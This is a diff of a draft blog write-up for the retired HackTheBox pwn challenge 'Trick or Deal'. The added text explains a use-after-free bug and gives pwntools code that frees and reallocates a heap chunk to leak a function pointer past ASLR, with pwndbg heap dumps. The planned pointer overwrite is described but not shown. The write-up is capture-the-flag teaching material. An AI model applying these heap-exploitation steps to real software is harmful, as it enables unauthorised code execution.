@@ -6,7 +6,7 @@ draft: true
 
 # Introduction
 
-**Trick or Deal** is *Medium* a retired [hackthebox](https://app.hackthebox.com/challenges/trick-or-deal) ***pwn*** challenge.
+**Trick or Deal** is a *Medium* retired [hackthebox](https://app.hackthebox.com/challenges/trick-or-deal) ***pwn*** challenge.
 
 This binary has a secret function `unlock_storage()`, and a **Use-After-Free** vulnerability.
 
@@ -15,7 +15,7 @@ To exploit this binary, I will use [pwndbg](https://github.com/pwndbg/pwndbg) an
 
 # Analysis
 
-The binary give us a **menu** with **5 actions**. Each actions will call a function.
+The binary gives us a **menu** with **5 actions**. Each actions will call a function.
 
 ```
 -_-_-_-_-_-_-_-_-_-_-_-_-
@@ -364,8 +364,161 @@ The binary has a variable **`storage`** that holds some *ascii data* and a **poi
 
 ## The Bug
 
-We have a **Use-After-Free** bug, which mean we can 
+We have a **Use-After-Free** bug, which mean that the program does not check if the memory has been free when we call the functions. Here we have a possibilty to realloc data of our own, and still use the *action 1* that call the pointer present on the heap.
 
+
+## The exploit
+
+Our strategy is to **replace** the pointer to `printStorage()` with a pointer to `unlock_storage()`.  
+
+Since the binary is protected with *ASLR*, we first need to **leak** the `printStorage()` pointer. We can then calculate the address of `unlock_storage()` by adding the needed *offset* to our *leaked pointer*.
+
+Fist let's create an exploit skeleton use the `pwn template` command from pwntools.
+
+    $ pwn template trick_or_deal
+
+and let's add a few helper function, to make or exloit developement easier.
+
+```Python
+#!/usr/bin/env python3
+# coding: utf-8
+
+from pwn import *
+
+# Create a new pane the tilix terminal emulator when using the GDB option
+# context.terminal = ['tilix','--action=session-add-right', '-e']
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('trick_or_deal')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+# RUNPATH:  b'./glibc/'
+
+
+# Helper functions
+
+def free():
+    io.recvuntil(b'[*] What do you want to do?')
+    io.sendline(b'4')
+
+def malloc(size, data):
+    io.sendafter(b'[*] What do you want to do?', b'3\n')
+    io.sendafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y\n')
+    
+    io.sendafter(b'[*] How long do you want your offer to be?', f"{size}".encode())
+    io.sendafter(b'[*] What can you offer me? ', data)
+
+
+io = start()
+
+
+
+io.interactive()
+```
+
+
+### Leak address
+
+We free the inital buffer, and we malloc 
+
+```Python
+io = start()
+
+free()
+
+# We don't overwrite the function pointer so that we can leak it.
+payload = 0x48 * b'Y'
+malloc(0x58, payload)
+
+# Leak pointer
+io.sendlineafter(b'[*] What do you want to do? ', b'1')
+
+leak = u64(io.readline()[:6] + b'\x00\x00')
+log.info(f"printStorage leak: {hex(leak)}")
+
+io.interactive()
+```
+
+Note that the chunk is of size *0x60*, so we malloc *0x58* as malloc add *8* bytes for chunk metadata.
+
+Initally the heap looked like this :
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290 
+
+0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
+0x5555556032a0  <font color="#A1EFE4">0x67694c206568540a</font> <font color="#A1EFE4">0x0a72656261737468</font> <font color="#A1EFE4">.The Lightsaber.</font>
+0x5555556032b0  <font color="#A1EFE4">0x6e6f53206568540a</font> <font color="#A1EFE4">0x7765726353206369</font> <font color="#A1EFE4">.The Sonic Screw</font>
+0x5555556032c0  <font color="#A1EFE4">0x0a0a726576697264</font> <font color="#A1EFE4">0x0a73726573616850</font> <font color="#A1EFE4">driver..Phasers.</font>
+0x5555556032d0  <font color="#A1EFE4">0x696f4e206568540a</font> <font color="#A1EFE4">0x6b63697243207973</font> <font color="#A1EFE4">.The Noisy Crick</font>
+0x5555556032e0  <font color="#A1EFE4">0x00000000000a7465</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">et........@UUU..</font>
+0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font>    &lt;-- Top chunk
+</code></pre></div>
+{{< /rawhtml >}}
+
+We can run our script with debugging options `$ ./xpl.py NOASLR DEBUG GDB`.
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290 
+
+0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
+0x5555556032a0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
+0x5555556032b0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
+0x5555556032c0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
+0x5555556032d0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
+0x5555556032e0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">YYYYYYYY..@UUU..</font>
+0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font> &lt;-- Top chunk
+</code></pre></div>
+{{< /rawhtml >}}
+
+
+We have fill the buffer with `'Y'` and there are no  `'\x00'` left that would indicate a end of file.
+The pointer will be considered as part of the string and will be printed when we call `printStorage()`.
+
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">    b&apos;[*] What do you want to do? &apos;
+[<font color="#F92672"><b>DEBUG</b></font>] Sent 0x2 bytes:
+    b&apos;1\n&apos;
+[<font color="#F92672"><b>DEBUG</b></font>] Received 0x17a bytes:
+    00000000  <font color="#F92672">0a</font> <font color="#66D9EF">1b</font> 5b 31  3b 33 32 6d  57 65 61 70  6f 6e 73 20  │<font color="#F92672">·</font><font color="#66D9EF">·</font>[1<font color="#66D9EF">│</font>;32m<font color="#66D9EF">│</font>Weap<font color="#66D9EF">│</font>ons │
+    00000010  69 6e 20 73  74 6f 63 6b  3a 20 <font color="#F92672">0a</font> 20  59 59 59 59  │in s<font color="#66D9EF">│</font>tock<font color="#66D9EF">│</font>: <font color="#F92672">·</font> <font color="#66D9EF">│</font>YYYY│
+    00000020  59 59 59 59  59 59 59 59  59 59 59 59  59 59 59 59  │YYYY<font color="#66D9EF">│</font>YYYY<font color="#66D9EF">│</font>YYYY<font color="#66D9EF">│</font>YYYY│
+    *
+    00000060  59 59 59 59  <font color="#66D9EF">e6</font> <font color="#66D9EF">0b</font> 40 55  55 55 20 <font color="#66D9EF">1b</font>  5b 31 3b 33  │YYYY<font color="#66D9EF">│··</font>@U<font color="#66D9EF">│</font>UU <font color="#66D9EF">·│</font>[1;3│
+    *
+[<font color="#66D9EF"><b>*</b></font>] printStorage leak: 0x555555400be6
+[<font color="#66D9EF"><b>*</b></font>] Switching to interactive mode
+</code></pre></div>
+{{< /rawhtml >}}
 
 
 
@@ -373,3 +526,6 @@ We have a **Use-After-Free** bug, which mean we can
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">
 </code></pre></div>
 {{< /rawhtml >}}
+
+
+
